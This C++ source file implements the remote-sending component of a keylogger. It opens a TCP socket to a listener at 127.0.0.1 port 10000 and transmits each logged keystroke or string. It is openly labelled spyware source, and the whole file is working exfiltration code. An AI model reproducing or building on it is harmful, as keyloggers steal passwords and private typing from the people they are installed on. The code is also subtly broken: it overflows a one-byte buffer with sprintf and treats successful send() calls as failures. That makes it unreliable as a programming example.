#include "./keylogger_remote.hpp"

keylogger_remote::keylogger_remote()
{
	a_socket = 0;
}

keylogger_remote::~keylogger_remote()
{
	closesocket(a_socket);
}

void keylogger_remote::initialize()
{
	WSADATA t_wsa_data;

	int t_result = 0;

	t_result = WSAStartup(MAKEWORD(2,2), &t_wsa_data);
	if(t_result != NO_ERROR)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		exit(1);
	}

	SOCKADDR_IN t_sockaddr_in;
	t_sockaddr_in.sin_addr.s_addr	= inet_addr("127.0.0.1");
	t_sockaddr_in.sin_family		= AF_INET;
	t_sockaddr_in.sin_port		= htons(10000);

	a_socket = socket(AF_INET,SOCK_STREAM,0);

	if(a_socket == INVALID_SOCKET)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		WSACleanup();
		exit(1);
	}

	t_result = connect(a_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));

	if(t_result != NO_ERROR)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		WSACleanup();
		exit(1);
	}
}

void keylogger_remote::save(int p_key)
{
	char t_buffer[1];

	sprintf(t_buffer, "%d", p_key);

	cout << "Send : " << char(p_key) << endl;

	if(send(a_socket, t_buffer, 1, 0) != 0)
	{
		cerr << "send" << endl;
		exit(1);
	}
}

void keylogger_remote::save(LPCSTR p_key)
{
	if(send(a_socket, p_key, strlen(p_key), 0) != 0)
	{
		cerr << "send" << endl;
		exit(1);
	}
}
